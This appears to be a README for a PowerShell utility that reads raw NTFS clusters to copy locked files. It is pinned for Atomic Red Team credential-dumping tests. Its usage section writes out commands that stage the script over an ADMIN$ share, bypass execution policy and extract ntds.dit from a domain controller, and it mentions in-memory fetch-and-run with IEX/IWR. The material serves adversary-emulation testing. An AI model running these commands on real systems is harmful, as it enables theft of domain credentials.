# UnderlayCopy

PowerShell utility for low-level NTFS acquisition of files that are locked while Windows is running (e.g. `ntds.dit`, registry hives). Reads raw volume clusters instead of going through the filesystem namespace.

## Provenance

| Field | Value |
|---|---|
| Source | `kfallahi/UnderlayCopy` |
| Pinned commit | `37f2e9b76b724bc1211437b14deaf1e76b21791e` |
| Raw URL | `https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1` |
| SHA-256 | `9497661039439911BEC63999D05F81A58AF06B05DD5C3AE28C6F815AED3B06A9` |
| Size | 14266 bytes |

Pinned the exact commit used by Atomic Red Team `T1003.003` #10 (MFT) and #11 (Metadata). The script defines a single function; it does **not** execute anything on load.

## Modes

- `-Mode MFT` — opens the source file with `FILE_READ_ATTRIBUTES` (0x80) only to obtain its MFT record number (FRN), parses the `$MFT` record's `$DATA` data runs directly off the `\\.\C:` device handle, then reads the file's clusters by LCN offset.
- `-Mode Metadata` — uses `fsutil.exe file queryextents <source>` to obtain the cluster runs, then reads them off the device handle the same way.

Neither mode creates a Volume Shadow Copy, touches the registry, or opens the source with read-data access.

## Usage

Since the Atomic Red Team test runs the script in memory via `IEX (IWR <url>)`, an equivalent portability approach is to stage the file on the target through an administrative share and dot-source it locally:

```powershell
Copy-Item .\UnderlayCopy.ps1 \\target-host\ADMIN$\UnderlayCopy.ps1
Copy-Item \\target-host\ADMIN$\UnderlayCopy.ps1 C:\Windows\Temp\UnderlayCopy.ps1
powershell -ExecutionPolicy Bypass -Command ". C:\Windows\Temp\UnderlayCopy.ps1; Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit"
```

Requires Administrator. Add a second `Underlay-Copy` call for `C:\Windows\System32\config\SYSTEM` if reproducing the full ART test flow.

## Verification / cleanup

```powershell
# valid ESE database -> prints a header
esentutl /mh C:\Windows\Temp\ntds.dit

Remove-Item C:\Windows\Temp\ntds.dit,C:\Windows\Temp\SYSTEM_HIVE -Force -ErrorAction SilentlyContinue
```

## C# port

A C# port of this utility exists at `../UnderlayCopyCS/`, covering `-Mode MFT`, `-Mode Metadata`, and an index-resolution mode that resolves the target without opening the source. This directory is retained for upstream parity/provenance of the pinned commit only.
